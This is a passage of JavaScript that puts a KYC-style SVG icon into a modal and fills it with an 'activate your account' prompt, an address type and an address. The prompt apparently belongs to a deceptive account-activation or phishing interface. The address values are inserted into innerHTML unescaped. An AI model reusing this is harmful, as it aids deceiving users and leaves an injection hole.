		svg.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 97" fill="none" class="css-1li56ln"><path d="M66 8.088l4 4 4-4-4-4-4 4zM41 91.088l3 3 3-3-3-3-3 3zM14 87.088h3v-3h-3v3z" fill="#E6E8EA"></path><path d="M6 18.088h84v60H6v-60z" fill="url(#kyc-light_svg__paint0_linear)"></path><path d="M6 49.088h84v29H6v-29z" fill="url(#kyc-light_svg__paint1_linear)"></path><path fill="#fff" d="M14 31.088h24v34H14z"></path><path fill="#fff" d="M14 31.088h24v18H14z"></path><path d="M33 44.089a7 7 0 10-14.001 0 7 7 0 0014 0z" fill="url(#kyc-light_svg__paint2_linear)"></path><path d="M14 55.088v12h24v-12h-7l-5 5-5-5h-7z" fill="url(#kyc-light_svg__paint3_linear)"></path><path d="M45 31.088h19v4H45v-4z" fill="url(#kyc-light_svg__paint4_linear)"></path><path d="M45 43.088h37v4H45v-4z" fill="url(#kyc-light_svg__paint5_linear)"></path><path fill="#76808F" d="M45 55.088h37v4H45zM45 63.088h37v4H45z"></path><path d="M32.999 44.089a7 7 0 11-14 0 7 7 0 0114 0z" fill="url(#kyc-light_svg__paint6_linear)"></path><path d="M31.744 48.088a6.992 6.992 0 01-5.745 3 6.992 6.992 0 01-5.746-3h11.491z" fill="#E6E8EA"></path><path d="M0 47.088h96v4H0v-4z" fill="#76808F"></path><defs><linearGradient id="kyc-light_svg__paint0_linear" x1="48" y1="18.088" x2="48" y2="78.088" gradientUnits="userSpaceOnUse"><stop stop-color="#929AA5"></stop><stop offset="1" stop-color="#76808F"></stop></linearGradient><linearGradient id="kyc-light_svg__paint1_linear" x1="90" y1="49.845" x2="90" y2="77.088" gradientUnits="userSpaceOnUse"><stop stop-color="#FAFAFA"></stop><stop offset="1" stop-color="#E6E8EA"></stop></linearGradient><linearGradient id="kyc-light_svg__paint2_linear" x1="26" y1="37.088" x2="26" y2="67.088" gradientUnits="userSpaceOnUse"><stop stop-color="#929AA5"></stop><stop offset="1" stop-color="#76808F"></stop></linearGradient><linearGradient id="kyc-light_svg__paint3_linear" x1="26" y1="37.088" x2="26" y2="67.088" gradientUnits="userSpaceOnUse"><stop stop-color="#929AA5"></stop><stop offset="1" stop-color="#76808F"></stop></linearGradient><linearGradient id="kyc-light_svg__paint4_linear" x1="45" y1="39.088" x2="82" y2="39.088" gradientUnits="userSpaceOnUse"><stop stop-color="#F0B90B"></stop><stop offset="1" stop-color="#F8D33A"></stop></linearGradient><linearGradient id="kyc-light_svg__paint5_linear" x1="45" y1="39.088" x2="82" y2="39.088" gradientUnits="userSpaceOnUse"><stop stop-color="#F0B90B"></stop><stop offset="1" stop-color="#F8D33A"></stop></linearGradient><linearGradient id="kyc-light_svg__paint6_linear" x1="25.999" y1="51.089" x2="25.999" y2="37.089" gradientUnits="userSpaceOnUse"><stop stop-color="#F0B90B"></stop><stop offset="1" stop-color="#F8D33A"></stop></linearGradient></defs></svg>`
	}
	if (theme == 'dark') {
		svg.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 97" fill="none" class="css-vr5bno"><path d="M66 8.088l4 4 4-4-4-4-4 4zM41 91.088l3 3 3-3-3-3-3 3zM14 87.088h3v-3h-3v3z" fill="#E6E8EA"></path><path d="M6 18.088h84v60H6v-60z" fill="url(#kyc-light_svg__paint0_linear)"></path><path d="M6 49.088h84v29H6v-29z" fill="url(#kyc-light_svg__paint1_linear)"></path><path fill="#fff" d="M14 31.088h24v34H14z"></path><path fill="#fff" d="M14 31.088h24v18H14z"></path><path d="M33 44.089a7 7 0 10-14.001 0 7 7 0 0014 0z" fill="url(#kyc-light_svg__paint2_linear)"></path><path d="M14 55.088v12h24v-12h-7l-5 5-5-5h-7z" fill="url(#kyc-light_svg__paint3_linear)"></path><path d="M45 31.088h19v4H45v-4z" fill="url(#kyc-light_svg__paint4_linear)"></path><path d="M45 43.088h37v4H45v-4z" fill="url(#kyc-light_svg__paint5_linear)"></path><path fill="#76808F" d="M45 55.088h37v4H45zM45 63.088h37v4H45z"></path><path d="M32.999 44.089a7 7 0 11-14 0 7 7 0 0114 0z" fill="url(#kyc-light_svg__paint6_linear)"></path><path d="M31.744 48.088a6.992 6.992 0 01-5.745 3 6.992 6.992 0 01-5.746-3h11.491z" fill="#E6E8EA"></path><path d="M0 47.088h96v4H0v-4z" fill="#76808F"></path><defs><linearGradient id="kyc-light_svg__paint0_linear" x1="48" y1="18.088" x2="48" y2="78.088" gradientUnits="userSpaceOnUse"><stop stop-color="#929AA5"></stop><stop offset="1" stop-color="#76808F"></stop></linearGradient><linearGradient id="kyc-light_svg__paint1_linear" x1="90" y1="49.845" x2="90" y2="77.088" gradientUnits="userSpaceOnUse"><stop stop-color="#FAFAFA"></stop><stop offset="1" stop-color="#E6E8EA"></stop></linearGradient><linearGradient id="kyc-light_svg__paint2_linear" x1="26" y1="37.088" x2="26" y2="67.088" gradientUnits="userSpaceOnUse"><stop stop-color="#929AA5"></stop><stop offset="1" stop-color="#76808F"></stop></linearGradient><linearGradient id="kyc-light_svg__paint3_linear" x1="26" y1="37.088" x2="26" y2="67.088" gradientUnits="userSpaceOnUse"><stop stop-color="#929AA5"></stop><stop offset="1" stop-color="#76808F"></stop></linearGradient><linearGradient id="kyc-light_svg__paint4_linear" x1="45" y1="39.088" x2="82" y2="39.088" gradientUnits="userSpaceOnUse"><stop stop-color="#F0B90B"></stop><stop offset="1" stop-color="#F8D33A"></stop></linearGradient><linearGradient id="kyc-light_svg__paint5_linear" x1="45" y1="39.088" x2="82" y2="39.088" gradientUnits="userSpaceOnUse"><stop stop-color="#F0B90B"></stop><stop offset="1" stop-color="#F8D33A"></stop></linearGradient><linearGradient id="kyc-light_svg__paint6_linear" x1="25.999" y1="51.089" x2="25.999" y2="37.089" gradientUnits="userSpaceOnUse"><stop stop-color="#F0B90B"></stop><stop offset="1" stop-color="#F8D33A"></stop></linearGradient></defs></svg>`
	}

	modal_body.removeChild(modal_body.firstChild);
	modal_body.insertBefore(svg, modal_body.firstChild);

	title_element.textContent = 'Please activate your account'
	text_element.innerHTML = `
		<div>${adress_type}</div>
		<div>${adress}</div>
	`
	allow_button[1].textContent = 'Activate now'

}








